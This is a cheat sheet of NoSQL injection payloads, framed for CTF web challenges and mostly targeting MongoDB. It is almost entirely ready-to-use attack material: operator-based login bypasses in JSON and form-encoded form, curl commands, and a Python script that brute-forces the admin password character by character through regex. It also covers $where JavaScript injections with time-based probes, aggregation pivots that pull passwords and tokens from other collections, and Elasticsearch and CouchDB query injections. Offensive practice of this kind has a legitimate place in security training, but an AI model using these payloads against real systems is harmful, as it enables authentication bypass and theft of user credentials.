# NoSQL Injection

Mostly MongoDB in CTF web challenges. First identify whether the backend receives JSON, URL-encoded nested params, GraphQL variables, or a raw query object.

## Login Bypass

```json
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":"admin","password":{"$ne":null}}
{"username":{"$regex":"^admin$"},"password":{"$ne":null}}
{"$or":[{"username":"admin"},{"username":{"$ne":null}}],"password":{"$ne":null}}
{"username":{"$in":["admin","administrator","root"]},"password":{"$ne":null}}
```

Form parser version:

```text
username[$ne]=x&password[$ne]=x
username=admin&password[$ne]=x
username[$regex]=^admin$&password[$ne]=x
username[$in][]=admin&username[$in][]=root&password[$ne]=x
$or[0][username]=admin&$or[1][username][$ne]=x&password[$ne]=x
```

## Mongo Operators

```json
{"$ne":null}
{"$gt":""}
{"$gte":""}
{"$lt":"~"}
{"$regex":"^a"}
{"$exists":true}
{"$in":["admin"]}
{"$nin":[""]}
{"$not":{"$regex":"^$"}}
{"$type":"string"}
{"$expr":{"$eq":[1,1]}}
```

Top-level logic:

```json
{"$or":[{"role":"admin"},{"username":"admin"}]}
{"$and":[{"username":"admin"},{"password":{"$ne":null}}]}
{"$nor":[{"disabled":true}]}
```

## Parser / Content-Type Checks

```bash
curl http://HOST/login -H 'Content-Type: application/json' -d '{"username":{"$ne":null},"password":{"$ne":null}}'
curl http://HOST/login -H 'Content-Type: application/x-www-form-urlencoded' -d 'username[$ne]=x&password[$ne]=x'
curl http://HOST/login -H 'Content-Type: application/json' -d '{"username":"admin","password":["x"]}'
curl http://HOST/login -H 'Content-Type: application/json' -d '{"username":"admin","password":true}'
```

Duplicate source parsing:

```text
GET /login?username=admin
POST username[$ne]=x&password[$ne]=x
```

## Regex Extract

```python
import requests
import string
import re

url = "http://TARGET/login"
known = ""
chars = string.ascii_letters + string.digits + "_{}-!@#$%^&*().,:;[]"

while not known.endswith("}"):
    for c in chars:
        prefix = re.escape(known + c)
        r = requests.post(url, json={
            "username": "admin",
            "password": {"$regex": "^" + prefix}
        })
        if "Welcome" in r.text:
            known += c
            print(known)
            break
```

Length / prefix probes:

```json
{"password":{"$regex":"^.{32}$"}}
{"password":{"$regex":"^CBC\\{"}}
{"password":{"$not":{"$regex":"^wrong"}}}
```

## JavaScript `$where`

Works only if server-side JavaScript is enabled and user input reaches `$where`.

```json
{"$where":"return true"}
{"$where":"this.username=='admin' && this.password.length > 10"}
{"$where":"this.password && this.password.startsWith('CBC{')"}
```

Time-ish probe:

```json
{"$where":"if (this.username=='admin') { var t=Date.now(); while(Date.now()-t<2000){}; } return true"}
```

If only a JavaScript expression/body is concatenated:

```text
'; return true; //
'; return this.password.startsWith('CBC{'); //
'; var t=Date.now(); while(Date.now()-t<2000){}; return true; //
```

## Aggregation Injection

```json
{
  "query": [
    {"$match": {"title": null}},
    {"$unionWith": {
      "coll": "users",
      "pipeline": [
        {"$match": {"username": "admin", "password": {"$regex": "^a"}}}
      ]
    }}
  ]
}
```

Other aggregation pivots:

```json
[
  {"$lookup":{"from":"users","localField":"x","foreignField":"x","as":"leak"}},
  {"$project":{"leak.password":1,"leak.token":1}}
]
```

```json
[
  {"$unionWith":{"coll":"users"}},
  {"$match":{"password":{"$regex":"^CBC\\{"}}},
  {"$project":{"username":1,"password":1,"token":1}}
]
```

If `$function` is allowed:

```json
[
  {"$addFields":{"pwn":{"$function":{"body":"function(){return process.version}","args":[],"lang":"js"}}}}
]
```

## Projection / Sort / Populate

Useful when filter injection is blocked but projection/sort are user-controlled.

```json
{"projection":{"password":1,"token":1,"_id":0}}
{"fields":{"password":1,"token":1}}
{"sort":{"isAdmin":-1}}
{"limit":1000}
{"skip":0}
```

Mongoose-style:

```json
{"populate":"user"}
{"select":"+password +token +secret"}
```

## Other NoSQL Targets

Elasticsearch query injection:

```json
{"query":{"match_all":{}}}
{"query":{"bool":{"should":[{"wildcard":{"flag":"CBC*"}},{"match_all":{}}]}}}
{"size":1000,"_source":["username","password","token","flag"]}
```

CouchDB selector:

```json
{"selector":{"_id":{"$gt":null}}}
{"selector":{"flag":{"$regex":"^CBC"}}}
```

## Parser Check

```bash
curl http://HOST/login -H 'Content-Type: application/json' -d '{"username":{"$ne":null},"password":{"$ne":null}}'
curl http://HOST/login -H 'Content-Type: application/x-www-form-urlencoded' -d 'username[$ne]=x&password[$ne]=x'
```
